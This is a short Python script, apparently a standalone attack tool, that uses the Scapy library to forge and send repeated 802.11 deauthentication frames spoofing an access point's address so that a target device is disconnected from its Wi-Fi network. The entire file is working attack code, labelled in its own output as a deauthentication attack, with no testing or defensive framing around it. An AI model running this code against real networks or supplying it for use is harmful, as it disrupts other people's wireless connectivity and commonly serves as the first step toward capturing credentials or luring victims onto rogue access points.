

from scapy.all import *

def send_deauth(target_mac, ap_mac, iface, count=100):
    print(f"[!] Sending {count} deauth packets from {ap_mac} to {target_mac} via {iface}...")
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=count, inter=0.1, verbose=0)
    print("[+] Deauthentication attack complete.")